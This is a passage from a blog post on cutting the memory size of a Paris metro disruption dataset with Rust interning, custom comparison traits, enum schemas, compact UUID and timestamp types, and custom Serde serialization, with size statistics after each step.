<span>#[derive(PartialEq,</span> <span>Eq,</span> <span>PartialOrd,</span> <span>Ord)]</span>
<span>struct</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>id</span><span>:</span> <span>u32</span><span>,</span>
    <span>_phantom</span><span>:</span> <span>PhantomData</span><span>&lt;</span><span>fn</span><span>()</span> <span>-&gt;</span> <span>T</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>struct</span> <span>MyArbitraryType</span><span>;</span>

<span>fn</span> <span>foo</span><span>(</span><span>set</span><span>:</span> <span>&amp;</span><span>mut</span> <span>[</span><span>Interned</span><span>&lt;</span><span>MyArbitraryType</span><span>&gt;</span><span>])</span> <span>{</span>
    <span>// error[E0277]: the trait bound `MyArbitraryType: Ord` is not satisfied</span>
    <span>set</span><span>.sort_unstable</span><span>();</span>
<span>}</span>
</code></pre></div>

<div id="derive-error-277"><pre><code>error[E0277]: the trait bound `MyArbitraryType: Ord` is not satisfied
    --&gt; src/lib.rs:13:9
     |
13   |     set.sort_unstable();
     |         ^^^^^^^^^^^^^ the trait `Ord` is not implemented for `MyArbitraryType`
     |
     = help: the trait `Ord` is implemented for `Interned&lt;T&gt;`
note: required for `Interned&lt;MyArbitraryType&gt;` to implement `Ord`
    --&gt; src/lib.rs:3:37
     |
3    | #[derive(PartialEq, Eq, PartialOrd, Ord)]
     |                                     ^^^ unsatisfied trait bound introduced in this `derive` macro
note: required by a bound in `core::slice::&lt;impl [T]&gt;::sort_unstable`
    --&gt; /playground/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/slice/mod.rs:2932:12
     |
2930 |     pub fn sort_unstable(&amp;mut self)
     |            ------------- required by a bound in this associated function
2931 |     where
2932 |         T: Ord,
     |            ^^^ required by this bound in `core::slice::&lt;impl [T]&gt;::sort_unstable`
     = note: this error originates in the derive macro `Ord` (in Nightly builds, run with -Z macro-backtrace for more info)
help: consider annotating `MyArbitraryType` with `#[derive(Ord)]`
     |
9    + #[derive(Ord)]
10   | struct MyArbitraryType;
     |
</code></pre></div>

<p>So we have to implement the comparison traits manually on <code>Interned&lt;T&gt;</code>, which isn’t <em>that</em> bad.
Note that if we implement <code>PartialEq</code> manually, we can <code>derive(Hash)</code> it but a <a href="https://rust-lang.github.io/rust-clippy/master/index.html#derived_hash_with_manual_eq">Clippy lint</a> will warn against that.</p>

<div id="manual-comparisons"><pre><code><span>use</span> <span>std</span><span>::</span><span>cmp</span><span>::</span><span>Ordering</span><span>;</span>
<span>use</span> <span>std</span><span>::</span><span>hash</span><span>::{</span><span>Hash</span><span>,</span> <span>Hasher</span><span>};</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>PartialEq</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>eq</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>Self</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
        <span>self</span><span>.id</span><span>.eq</span><span>(</span><span>&amp;</span><span>other</span><span>.id</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>Eq</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>PartialOrd</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>partial_cmp</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>Self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>Ordering</span><span>&gt;</span> <span>{</span>
        <span>Some</span><span>(</span><span>self</span><span>.cmp</span><span>(</span><span>other</span><span>))</span>
    <span>}</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>Ord</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>cmp</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>Self</span><span>)</span> <span>-&gt;</span> <span>Ordering</span> <span>{</span>
        <span>self</span><span>.id</span><span>.cmp</span><span>(</span><span>&amp;</span><span>other</span><span>.id</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>Hash</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>hash</span><span>&lt;</span><span>H</span><span>&gt;</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>state</span><span>:</span> <span>&amp;</span><span>mut</span> <span>H</span><span>)</span>
    <span>where</span>
        <span>H</span><span>:</span> <span>Hasher</span><span>,</span>
    <span>{</span>
        <span>self</span><span>.id</span><span>.hash</span><span>(</span><span>state</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>I then chose to create an <code>InternedSet&lt;T&gt;</code> abstraction, that will sort the items in canonical order.
Note the use of the <a href="https://doc.rust-lang.org/std/primitive.slice.html#method.sort_unstable"><code>sort_unstable()</code></a> function, which is more efficient than the generic <a href="https://doc.rust-lang.org/std/primitive.slice.html#method.sort"><code>sort()</code></a>.
Also note that we store the set as a boxed slice <code>Box&lt;[_]&gt;</code> instead of a <code>Vec&lt;_&gt;</code>, which is more compact for immutable sequences as it doesn’t require storing a capacity field to potentially grow the vector.</p>

<div><pre><code><span>#[derive(Debug,</span> <span>Hash,</span> <span>PartialEq,</span> <span>Eq)]</span>
<span>struct</span> <span>InternedSet</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>set</span><span>:</span> <span>Box</span><span>&lt;</span><span>[</span><span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span><span>]</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>InternedSet</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>new</span><span>(</span><span>set</span><span>:</span> <span>impl</span> <span>IntoIterator</span><span>&lt;</span><span>Item</span> <span>=</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;&gt;</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>let</span> <span>mut</span> <span>set</span><span>:</span> <span>Box</span><span>&lt;</span><span>[</span><span>_</span><span>]</span><span>&gt;</span> <span>=</span> <span>set</span><span>.into_iter</span><span>()</span><span>.collect</span><span>();</span>
        <span>set</span><span>.sort_unstable</span><span>();</span>
        <span>Self</span> <span>{</span> <span>set</span> <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>We can then integrate it into the schema as follows.</p>

<div><pre><code><span>struct</span> <span>ImpactedObject</span> <span>{</span>
    <span>typ</span><span>:</span> <span>IString</span><span>,</span>
    <span>id</span><span>:</span> <span>IString</span><span>,</span>
    <span>name</span><span>:</span> <span>IString</span><span>,</span>
    <span>disruption_ids</span><span>:</span> <span>InternedSet</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span> <span>ImpactedObject</span> <span>{</span>
    <span>fn</span> <span>from</span><span>(</span><span>interners</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Interners</span><span>,</span> <span>source</span><span>:</span> <span>source</span><span>::</span><span>ImpactedObject</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>Self</span> <span>{</span>
            <span>typ</span><span>:</span> <span>Interned</span><span>::</span><span>from</span><span>(</span><span>&amp;</span><span>mut</span> <span>interners</span><span>.string</span><span>,</span> <span>source</span><span>.typ</span><span>),</span>
            <span>id</span><span>:</span> <span>Interned</span><span>::</span><span>from</span><span>(</span><span>&amp;</span><span>mut</span> <span>interners</span><span>.string</span><span>,</span> <span>source</span><span>.id</span><span>),</span>
            <span>name</span><span>:</span> <span>Interned</span><span>::</span><span>from</span><span>(</span><span>&amp;</span><span>mut</span> <span>interners</span><span>.string</span><span>,</span> <span>source</span><span>.name</span><span>),</span>
            <span>disruption_ids</span><span>:</span> <span>InternedSet</span><span>::</span><span>new</span><span>(</span>
                <span>source</span>
                    <span>.disruption_ids</span>
                    <span>.into_iter</span><span>()</span>
                    <span>.map</span><span>(|</span><span>x</span><span>|</span> <span>Interned</span><span>::</span><span>from</span><span>(</span><span>&amp;</span><span>mut</span> <span>interners</span><span>.string</span><span>,</span> <span>x</span><span>)),</span>
            <span>),</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>This change divided the number of different <code>Line</code> objects by 14, and the total optimized size by two once again (commit <a href="https://github.com/gendx/rust-interning/commit/bdb00b523433db5f1f4a3150507f3b05eef76de5">bdb00b5</a>).</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 16578863 bytes (relative size = 1.46%)
[50.70%] Interners: 8405895 bytes
- [26.74%] String interner: 56374 objects | 4433335 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
- [3.97%] Disruption interner: 7550 objects | 658748 bytes (87.25 bytes/object) | 625760 references (82.88 refs/object)
  - [0.63%] ApplicationPeriod interner: 5883 objects | 104488 bytes (17.76 bytes/object) | 631593 references (107.36 refs/object)
- [4.06%] Line interner: 6880 objects | 672568 bytes (97.76 bytes/object) | 930026 references (135.18 refs/object)
  - [15.30%] ImpactedObject interner: 55373 objects | 2536756 bytes (45.81 bytes/object) | 3183332 references (57.49 refs/object)
</code></pre></div>

<h3 id="using-enums-14"><span><a href="#using-enums-14"></a></span>Using enums (1.4%)</h3>

<p>At this point, the <code>Data</code> root structs used half of the optimized size.
You might have noticed that it contained only optional fields.</p>

<div><pre><code><span>struct</span> <span>Data</span> <span>{</span>
    <span>status_code</span><span>:</span> <span>Option</span><span>&lt;</span><span>i32</span><span>&gt;</span><span>,</span>
    <span>error</span><span>:</span> <span>Option</span><span>&lt;</span><span>IString</span><span>&gt;</span><span>,</span>
    <span>message</span><span>:</span> <span>Option</span><span>&lt;</span><span>IString</span><span>&gt;</span><span>,</span>
    <span>disruptions</span><span>:</span> <span>Option</span><span>&lt;</span><span>InternedSet</span><span>&lt;</span><span>Disruption</span><span>&gt;&gt;</span><span>,</span>
    <span>lines</span><span>:</span> <span>Option</span><span>&lt;</span><span>InternedSet</span><span>&lt;</span><span>Line</span><span>&gt;&gt;</span><span>,</span>
    <span>last_updated_date</span><span>:</span> <span>Option</span><span>&lt;</span><span>IString</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>However, in practice, the fields that are set come together: either the object contains an error, with <code>status_code</code>, <code>error</code> and <code>message</code> fields, or it contains useful data with <code>disruptions</code>, <code>lines</code> and <code>last_updated_date</code> fields.
So a better representation is to use an enumeration with two variants.</p>

<div><pre><code><span>enum</span> <span>Data</span> <span>{</span>
    <span>Success</span> <span>{</span>
        <span>disruptions</span><span>:</span> <span>InternedSet</span><span>&lt;</span><span>Disruption</span><span>&gt;</span><span>,</span>
        <span>lines</span><span>:</span> <span>InternedSet</span><span>&lt;</span><span>Line</span><span>&gt;</span><span>,</span>
        <span>last_updated_date</span><span>:</span> <span>IString</span><span>,</span>
    <span>},</span>
    <span>Error</span> <span>{</span>
        <span>status_code</span><span>:</span> <span>i32</span><span>,</span>
        <span>error</span><span>:</span> <span>IString</span><span>,</span>
        <span>message</span><span>:</span> <span>IString</span><span>,</span>
    <span>},</span>
<span>}</span>
</code></pre></div>

<p>This separation brings two benefits: the schema is more sound semantically and takes less space in memory.
Indeed, an <code>Interned&lt;T&gt;</code> uses 4 bytes (a <code>u32</code> index) but an <code>Option&lt;Interned&lt;T&gt;&gt;</code> uses 8 bytes: 1 bit for the option state and the rest to align to a multiple of 4 bytes.</p>

<p>The improvement was more modest this time (commit <a href="https://github.com/gendx/rust-interning/commit/c8ac2611348f271c8deffeb26b11aee022387baa">c8ac261</a>).</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 15847679 bytes (relative size = 1.39%)
[53.04%] Interners: 8405895 bytes
- [27.97%] String interner: 56374 objects | 4433335 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
- [4.16%] Disruption interner: 7550 objects | 658748 bytes (87.25 bytes/object) | 625760 references (82.88 refs/object)
  - [0.66%] ApplicationPeriod interner: 5883 objects | 104488 bytes (17.76 bytes/object) | 631593 references (107.36 refs/object)
- [4.24%] Line interner: 6880 objects | 672568 bytes (97.76 bytes/object) | 930026 references (135.18 refs/object)
  - [16.01%] ImpactedObject interner: 55373 objects | 2536756 bytes (45.81 bytes/object) | 3183332 references (57.49 refs/object)
</code></pre></div>

<h3 id="splitting-structs-082"><span><a href="#splitting-structs-082"></a></span>Splitting structs (0.82%)</h3>

<p>Another thing you may have noticed about the <code>ImpactedObject</code> example is that it contains both fields that are constant (type, identifier, name) and fields that change over time (list of disruptions).
This means that each time a disruption is added or removed from the list, a new <code>ImpactedObject</code> is created and added to the interner, even if the “header” fields that define the object haven’t changed.
A more optimized approach is to extract the fixed fields into a separate object, and to add a new interner for it.</p>

<div><pre><code><span>struct</span> <span>ImpactedObject</span> <span>{</span>
    <span>// Fixed part of an object.</span>
    <span>object</span><span>:</span> <span>Interned</span><span>&lt;</span><span>Object</span><span>&gt;</span><span>,</span>
    <span>disruption_ids</span><span>:</span> <span>InternedSet</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>// New struct grouping the fixed fields of an object.</span>
<span>struct</span> <span>Object</span> <span>{</span>
    <span>typ</span><span>:</span> <span>IString</span><span>,</span>
    <span>id</span><span>:</span> <span>IString</span><span>,</span>
    <span>name</span><span>:</span> <span>IString</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>Note that this new design doesn’t change the total number of <code>ImpactedObject</code>s (55373), but makes each one smaller: one <code>u32</code> index for an <code>Interned&lt;Object&gt;</code> instead of three <code>IString</code> indices.
There are however much fewer <code>Object</code>s (1679) because each one is referenced by many <code>ImpactedObject</code>s (commit <a href="https://github.com/gendx/rust-interning/commit/8914a64497362cab7847796d60a27aeb117134b5">8914a64</a>).</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 15330607 bytes (relative size = 1.35%)
[51.46%] Interners: 7888823 bytes
- [28.92%] String interner: 56374 objects | 4433335 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
- [4.30%] Disruption interner: 7550 objects | 658748 bytes (87.25 bytes/object) | 625760 references (82.88 refs/object)
  - [0.68%] ApplicationPeriod interner: 5883 objects | 104488 bytes (17.76 bytes/object) | 631593 references (107.36 refs/object)
- [3.67%] Line interner: 6880 objects | 562488 bytes (81.76 bytes/object) | 930026 references (135.18 refs/object)
  - [0.01%] LineHeader interner: 45 objects | 1428 bytes (31.73 bytes/object) | 930026 references (20667.24 refs/object)
  - [13.66%] ImpactedObject interner: 55373 objects | 2093772 bytes (37.81 bytes/object) | 3183332 references (57.49 refs/object)
    - [0.23%] Object interner: 1679 objects | 34564 bytes (20.59 bytes/object) | 3183332 references (1895.97 refs/object)
</code></pre></div>

<p>The improvement was small this time, but if we look at the second half of an <code>ImpactedObject</code> we can observe that several objects may be affected by the exact same set of disruptions, for example because they represent stations on the same line.
By adding another layer of indirection and interning the interned set, we can again reduce redundancy.
In practice there were only 9127 distinct sets of disruption IDs (commit <a href="https://github.com/gendx/rust-interning/commit/fcff0d5f1e9bc1089382170f5ed7f097190c48de">fcff0d5</a>).</p>

<div><pre><code><span>struct</span> <span>ImpactedObject</span> <span>{</span>
    <span>object</span><span>:</span> <span>Interned</span><span>&lt;</span><span>Object</span><span>&gt;</span><span>,</span>
    <span>// Also intern the set.</span>
    <span>disruption_ids</span><span>:</span> <span>Interned</span><span>&lt;</span><span>InternedSet</span><span>&lt;</span><span>String</span><span>&gt;&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>This reduced the optimized size by more than a third.</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 9364491 bytes (relative size = 0.82%)
[94.79%] Interners: 8877035 bytes
- [47.34%] String interner: 56374 objects | 4433335 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
- [3.50%] InternedSet&lt;String&gt; interner: 9127 objects | 327620 bytes (35.90 bytes/object) | 3183332 references (348.78 refs/object)
- [7.90%] InternedSet&lt;Disruption&gt; interner: 7066 objects | 739652 bytes (104.68 bytes/object) | 30430 references (4.31 refs/object)
  - [7.03%] Disruption interner: 7550 objects | 658748 bytes (87.25 bytes/object) | 625760 references (82.88 refs/object)
    - [1.12%] ApplicationPeriod interner: 5883 objects | 104488 bytes (17.76 bytes/object) | 631593 references (107.36 refs/object)
- [11.88%] InternedSet&lt;Line&gt; interner: 7183 objects | 1112896 bytes (154.93 bytes/object) | 30430 references (4.24 refs/object)
  - [6.01%] Line interner: 6880 objects | 562488 bytes (81.76 bytes/object) | 930026 references (135.18 refs/object)
    - [0.02%] LineHeader interner: 45 objects | 1428 bytes (31.73 bytes/object) | 930026 references (20667.24 refs/object)
    - [9.63%] ImpactedObject interner: 55373 objects | 901816 bytes (16.29 bytes/object) | 3183332 references (57.49 refs/object)
      - [0.37%] Object interner: 1679 objects | 34564 bytes (20.59 bytes/object) | 3183332 references (1895.97 refs/object)
</code></pre></div>

<h3 id="specializing-types-064"><span><a href="#specializing-types-064"></a></span>Specializing types (0.64%)</h3>

<p>After all these optimizations, strings were using half of the optimized space: each <code>Interner</code> is a table that other objects can reference by index.
In practice, the string interner contained values of very heterogeneous semantics: some strings were long error messages in HTML format, some were simple names of places, some were identifiers such as <a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">UUIDs</a> and others were timestamps in human-readable format.
The latter two are particularly interesting: instead of storing them as plain strings, we could parse them into more compact and semantically rich formats.</p>

<p>For UUIDs, we can simply use the <code>Uuid</code> type from the <a href="https://docs.rs/uuid/"><code>uuid</code></a> crate as a drop-in replacement.
Internally, this type uses only 16 bytes to store each identifier, instead of 36 bytes for strings like <code>67e55044-10b1-426f-9247-bb680e5fe0c8</code> (overhead of hexadecimal encoding + separators).</p>

<p>For timestamps, I opted for the <a href="https://docs.rs/chrono/"><code>chrono</code></a> crate, aiming to store each one in 8 bytes (64-bit number of seconds since the Unix epoch) rather than 15 to 24 bytes for something like <code>20240428T044500</code> or <code>2024-05-01T00:59:25.384Z</code>.
There was a difficulty however: some timestamps were encoded in <a href="https://tools.ietf.org/html/rfc3339">RFC 3339</a> format with millisecond precision in the UTC time zone, others were a naive date + time in seconds implicitly in the Paris time zone.
In that case, I used the <a href="https://docs.rs/chrono-tz/"><code>chrono-tz</code></a> crate to handle the conversion and canonicalize them to UTC.</p>

<p>There is a caveat however when the time zone is implicit: on days when <a href="https://en.wikipedia.org/wiki/Daylight_saving_time">daylight saving</a> starts or end, the times between 2am and 3am may either be ambiguous (we don’t know if we’re in the CET or CEST time zone when the time jumps back from 3am to 2am) or invalid (when the time jumps from 2am to 3am).
That said, the metro network is normally closed at this time, so a small imprecision isn’t too dramatic.
It would be more annoying for the scheduling of night trains for example.</p>

<div><pre><code><span>use</span> <span>chrono</span><span>::</span><span>offset</span><span>::</span><span>LocalResult</span><span>;</span>
<span>use</span> <span>chrono</span><span>::{</span><span>DateTime</span><span>,</span> <span>NaiveDateTime</span><span>};</span>
<span>use</span> <span>chrono_tz</span><span>::</span><span>Europe</span><span>::</span><span>Paris</span><span>;</span>

<span>struct</span> <span>TimestampSecondsParis</span><span>(</span><span>i64</span><span>);</span>

<span>impl</span> <span>TimestampSecondsParis</span> <span>{</span>
    <span>fn</span> <span>from_formatted</span><span>(</span><span>x</span><span>:</span> <span>&amp;</span><span>str</span><span>,</span> <span>format</span><span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>let</span> <span>naive_datetime</span> <span>=</span> <span>NaiveDateTime</span><span>::</span><span>parse_from_str</span><span>(</span><span>x</span><span>,</span> <span>format</span><span>)</span><span>.unwrap_or_else</span><span>(|</span><span>_</span><span>|</span> <span>{</span>
            <span>panic!</span><span>(</span><span>"Failed to parse datetime (custom format {format:?}) from {x}"</span><span>)</span>
        <span>});</span>

        <span>// Handle the specifics of times falling during the daylight saving transition.</span>
        <span>let</span> <span>datetime</span> <span>=</span> <span>match</span> <span>naive_datetime</span><span>.and_local_timezone</span><span>(</span><span>Paris</span><span>)</span> <span>{</span>
            <span>LocalResult</span><span>::</span><span>Single</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>x</span><span>,</span>
            <span>LocalResult</span><span>::</span><span>Ambiguous</span><span>(</span><span>earliest</span><span>,</span> <span>latest</span><span>)</span> <span>=&gt;</span> <span>{</span>
                <span>eprintln!</span><span>(</span><span>"Ambiguous mapping of {naive_datetime:?} to the Paris timezone: {earliest:?} or {latest:?}"</span><span>);</span>
                <span>earliest</span>
            <span>}</span>
            <span>LocalResult</span><span>::</span><span>None</span> <span>=&gt;</span> <span>{</span>
                <span>panic!</span><span>(</span><span>"Invalid mapping of {naive_datetime:?} to the Paris timezone"</span><span>)</span>
            <span>}</span>
        <span>};</span>

        <span>TimestampSecondsParis</span><span>(</span><span>datetime</span><span>.timestamp</span><span>())</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>These changes removed a large majority of the interned strings, shaving off another 2 MB (commits <a href="https://github.com/gendx/rust-interning/commit/2031f428a7d91019486d896e25824c17b1f0ce8f">2031f42</a> and <a href="https://github.com/gendx/rust-interning/commit/ad29181ff2ce5c0dff8d6d4e7010244456b60842">ad29181</a>).</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1322690141 bytes in memory (relative size = 116.31%)
Optimized to 7264110 bytes (relative size = 0.64%)
[89.93%] Interners: 6532926 bytes
- [25.03%] String interner: 8050 objects | 1818466 bytes (225.90 bytes/object) | 17309489 references (2150.25 refs/object)
- [2.25%] Uuid interner: 6617 objects | 163296 bytes (24.68 bytes/object) | 4735218 references (715.61 refs/object)
- [10.18%] InternedSet&lt;Disruption&gt; interner: 7066 objects | 739652 bytes (104.68 bytes/object) | 30430 references (4.31 refs/object)
  - [9.90%] Disruption interner: 7550 objects | 719148 bytes (95.25 bytes/object) | 625760 references (82.88 refs/object)
    - [2.09%] ApplicationPeriod interner: 5883 objects | 151552 bytes (25.76 bytes/object) | 631593 references (107.36 refs/object)
- [15.32%] InternedSet&lt;Line&gt; interner: 7183 objects | 1112896 bytes (154.93 bytes/object) | 30430 references (4.24 refs/object)
  - [7.74%] Line interner: 6880 objects | 562488 bytes (81.76 bytes/object) | 930026 references (135.18 refs/object)
    - [0.02%] LineHeader interner: 45 objects | 1428 bytes (31.73 bytes/object) | 930026 references (20667.24 refs/object)
    - [12.41%] ImpactedObject interner: 55373 objects | 901816 bytes (16.29 bytes/object) | 3183332 references (57.49 refs/object)
      - [0.48%] Object interner: 1679 objects | 34564 bytes (20.59 bytes/object) | 3183332 references (1895.97 refs/object)
      - [4.51%] InternedSet&lt;Uuid&gt; interner: 9127 objects | 327620 bytes (35.90 bytes/object) | 3183332 references (348.78 refs/object)
</code></pre></div>

<h2 id="serialization"><span><a href="#serialization"></a></span>Serialization</h2>

<p>At this point, we basically have an implicit in-memory database.
The next step is to serialize it, to see how interning plays out with persistence.
Serialization is also an important step to validate that the claimed space improvements are real.
Lastly, it’s an opportunity to further compress the data.</p>

<p>In Rust, the de-facto serialization framework is <a href="https://docs.rs/serde/"><code>serde</code></a>, which we’ve already used to <a href="#importing-the-data-135">import the JSON input</a>.
Serde supports many formats out-of-the-box, via extension crates, so I’ve decided to try a few of them.</p>

<ul>
  <li><a href="https://tools.ietf.org/html/rfc8949">CBOR</a>, via <a href="https://docs.rs/ciborium/"><code>ciborium</code></a>,</li>
  <li><a href="https://tools.ietf.org/html/rfc8259">JSON</a>, via <a href="https://docs.rs/serde_json/"><code>serde_json</code></a>,</li>
  <li><a href="https://postcard.jamesmunns.com/">Postcard</a>, via <a href="https://docs.rs/postcard/"><code>postcard</code></a>,</li>
  <li>The <a href="https://docs.rs/bincode/"><code>bincode</code></a> crate (no specification available).</li>
</ul>

<h3 id="writing-custom-deserializers-with-serde-029"><span><a href="#writing-custom-deserializers-with-serde-029"></a></span>Writing custom (de)serializers with Serde (0.29%)</h3>

<p>Usually, all you have to do is to annotate each type in your schema with <code>#[derive(Serialize, Deserialize)]</code> and Serde provides you (de)serialization functions out-of-the-box, which is the whole appeal of the framework.
However, this wouldn’t be very efficient for the <code>Interner&lt;T&gt;</code> table, which contains the same objects twice (in a vector and in a hash map).
Additionally, Serde’s <a href="https://docs.rs/serde/1.0.217/serde/trait.Serialize.html#impl-Serialize-for-Rc%3CT%3E">documentation</a> mentions that even though <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc</code></a> is (de)serializable if you opt into the <code>rc</code> feature, it copies the underlying content each time it’s referenced, which isn’t optimal nor semantically equivalent.</p>

<div><pre><code><span>struct</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>vec</span><span>:</span> <span>Vec</span><span>&lt;</span><span>Rc</span><span>&lt;</span><span>T</span><span>&gt;&gt;</span><span>,</span>
    <span>map</span><span>:</span> <span>HashMap</span><span>&lt;</span><span>Rc</span><span>&lt;</span><span>T</span><span>&gt;</span><span>,</span> <span>u32</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>In this case, we don’t want to serialize both the vector of objects and the lookup table of indices: the whole interner state can be recovered from the vector alone.
Indeed, if we deserialize the objects in the same order, they will get the same indices.
And hopefully, Serde makes it easy to serialize a sequence.</p>

<p>Indeed, the docs for <a href="https://docs.rs/serde/1.0.217/serde/trait.Serialize.html"><code>Serialize</code></a> and <a href="https://docs.rs/serde/1.0.217/serde/trait.Serializer.html"><code>Serializer</code></a> quickly guide us to a solution, namely the <a href="https://docs.rs/serde/1.0.217/serde/trait.Serializer.html#tymethod.serialize_seq"><code>serialize_seq()</code></a> or <a href="https://docs.rs/serde/1.0.217/serde/trait.Serializer.html#method.collect_seq"><code>collect_seq()</code></a> methods (the latter works well with functional-style iterators).</p>

<div><pre><code><span>use</span> <span>serde</span><span>::{</span><span>Serialize</span><span>,</span> <span>Serializer</span><span>};</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Serialize</span><span>&gt;</span> <span>Serialize</span> <span>for</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>serialize</span><span>&lt;</span><span>S</span><span>&gt;</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>serializer</span><span>:</span> <span>S</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>S</span><span>::</span><span>Ok</span><span>,</span> <span>S</span><span>::</span><span>Error</span><span>&gt;</span>
    <span>where</span>
        <span>S</span><span>:</span> <span>Serializer</span><span>,</span>
    <span>{</span>
        <span>// Tell Serde to serialize a sequence of items.</span>
        <span>serializer</span><span>.collect_seq</span><span>(</span><span>self</span><span>.vec</span><span>.iter</span><span>()</span><span>.map</span><span>(|</span><span>rc</span><span>|</span> <span>rc</span><span>.deref</span><span>()))</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>Deserialization is more complex, which isn’t surprising as it needs to handle potential errors in the serialized stream.
Ultimately, you need to check the <a href="https://serde.rs/impl-deserialize.html">guide directly on Serde’s website</a>, as the regular API documentation doesn’t explain the details.</p>

<p>One needs not only to manipulate the <a href="https://docs.rs/serde/1.0.217/serde/trait.Deserialize.html"><code>Deserialize</code></a> and <a href="https://docs.rs/serde/1.0.217/serde/trait.Deserializer.html"><code>Deserializer</code></a> traits, but also write a <a href="https://docs.rs/serde/1.0.217/serde/de/trait.Visitor.html"><code>Visitor</code></a> and (in this case) manipulate a <a href="https://docs.rs/serde/1.0.217/serde/de/trait.SeqAccess.html"><code>SeqAccess</code></a>.
There’s a lot more boilerplate, but it works out.</p>

<div id="deserialize-impl"><pre><code><span>use</span> <span>serde</span><span>::</span><span>de</span><span>::{</span><span>SeqAccess</span><span>,</span> <span>Visitor</span><span>};</span>
<span>use</span> <span>serde</span><span>::{</span><span>Deserialize</span><span>,</span> <span>Deserializer</span><span>};</span>

<span>impl</span><span>&lt;</span><span>'de</span><span>,</span> <span>T</span><span>&gt;</span> <span>Deserialize</span><span>&lt;</span><span>'de</span><span>&gt;</span> <span>for</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span>
<span>where</span>
    <span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span> <span>+</span> <span>Deserialize</span><span>&lt;</span><span>'de</span><span>&gt;</span><span>,</span>
<span>{</span>
    <span>fn</span> <span>deserialize</span><span>&lt;</span><span>D</span><span>&gt;</span><span>(</span><span>deserializer</span><span>:</span> <span>D</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>,</span> <span>D</span><span>::</span><span>Error</span><span>&gt;</span>
    <span>where</span>
        <span>D</span><span>:</span> <span>Deserializer</span><span>&lt;</span><span>'de</span><span>&gt;</span><span>,</span>
    <span>{</span>
